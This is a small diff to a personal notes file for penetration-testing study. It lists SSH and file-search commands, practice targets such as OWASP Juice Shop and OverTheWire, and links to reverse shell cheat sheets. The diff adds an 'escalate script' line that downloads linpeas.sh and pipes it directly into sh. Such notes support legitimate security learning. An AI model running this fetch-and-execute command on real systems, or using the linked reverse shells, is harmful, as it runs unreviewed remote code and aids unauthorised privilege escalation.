@@ -15,7 +15,7 @@ $ssh username@ip -p <port>
 \\use which to find folder 
 \\use ls ~/filename
 \\use find /path/to/search -type f -name "filename.txt"
-\\convert file XMLhtml $xsltproc <file.xml> 
+\\
 
 \\Vulnerable machine/app
 https://owasp.org/www-project-juice-shop/
@@ -35,3 +35,6 @@ https://overthewire.org/wargames/
 \\<script> payload web shell
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 https://highon.coffee/blog/reverse-shell-cheat-sheet/
+
+-------------escalate script
+\\curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
